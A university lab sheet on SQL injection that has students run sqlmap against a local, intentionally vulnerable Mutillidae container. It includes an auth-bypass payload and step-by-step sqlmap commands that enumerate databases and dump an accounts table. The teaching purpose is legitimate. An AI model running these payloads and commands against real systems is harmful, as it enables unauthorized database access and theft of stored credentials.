################################################################
# EXP 08 - Performing SQL Injection using SQLmap
################################################################

----------------------------------------------------------------
WHAT THIS EXPERIMENT COVERS (say this if asked)
----------------------------------------------------------------
AIM: Detect and exploit SQL Injection using SQLmap against an intentionally
vulnerable web app, and enumerate database info automatically.

TOPIC / CONCEPTS:
- SQL Injection (SQLi) = inserting malicious input into a SQL query because
  the app concatenates user input into queries without parameterization.
  Lets an attacker bypass auth, read, or modify database data.
  Example vulnerable query:
     SELECT * FROM users WHERE username='$username' AND password='$password';
  Auth-bypass payload:  ' OR '1'='1' --   (makes the condition always true)
- Types of SQLi: Authentication Bypass, Union-Based, Error-Based,
  Blind, Time-Based.
- SQLmap = open-source tool that AUTOMATES detecting + exploiting SQLi:
  detect injection, identify DBMS, enumerate databases/tables/columns,
  dump data.
- Prevention: Prepared Statements / Parameterized Queries + input validation.

----------------------------------------------------------------
SETUP (do this directly - works standalone)
----------------------------------------------------------------
sudo systemctl start docker
sudo docker run -d --name mutillidae -p 8081:80 citizenstig/nowasp
# if "name already in use":  sudo docker start mutillidae
sudo docker ps

# BUILD THE DB (REQUIRED or sqlmap finds nothing):
# Open http://127.0.0.1:8081
#  - if "database offline" -> click "setup/reset the DB" -> "Database has been built"
#  - Toggle Security until: Security Level 0 (Hosed)
# If DB errors:  sudo docker restart mutillidae  (wait 15s, reset DB again)

# Verify sqlmap:
sqlmap --version

# GET THE TARGET URL:
# Menu: A1 Injection (SQL) -> SQLi Extract Data -> User Info (SQL)
# Submit any name/password to produce the user-info.php URL.

----------------------------------------------------------------
COMMANDS
----------------------------------------------------------------
# 1) Detect injection
sqlmap -u "http://127.0.0.1:8081/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View Account Details" -p username --batch

# 2) List databases  (USE THE NAME IT PRINTS, usually nowasp)
sqlmap -u "http://127.0.0.1:8081/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View Account Details" -p username --batch --dbs

# 3) List tables
sqlmap -u "http://127.0.0.1:8081/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View Account Details" -p username --batch -D nowasp --tables

# 4) List columns
sqlmap -u "http://127.0.0.1:8081/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View Account Details" -p username --batch -D nowasp -T accounts --columns

# 5) Dump data
sqlmap -u "http://127.0.0.1:8081/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View Account Details" -p username --batch -D nowasp -T accounts --dump

# --batch = auto-answer all prompts.
# Show: injectable param, DBMS (MySQL), databases, tables, dumped rows.
# No data? DB not built -> click "setup/reset the DB", re-run --dbs, use printed name.

----------------------------------------------------------------
VIVA
----------------------------------------------------------------
Q: What is SQL Injection?
A: Inserting malicious input into a SQL query to read/modify the database.
Q: What is SQLmap?
A: An automated tool to detect and exploit SQL Injection vulnerabilities.
Q: Purpose of the -u option in SQLmap?
A: It specifies the target URL to test.
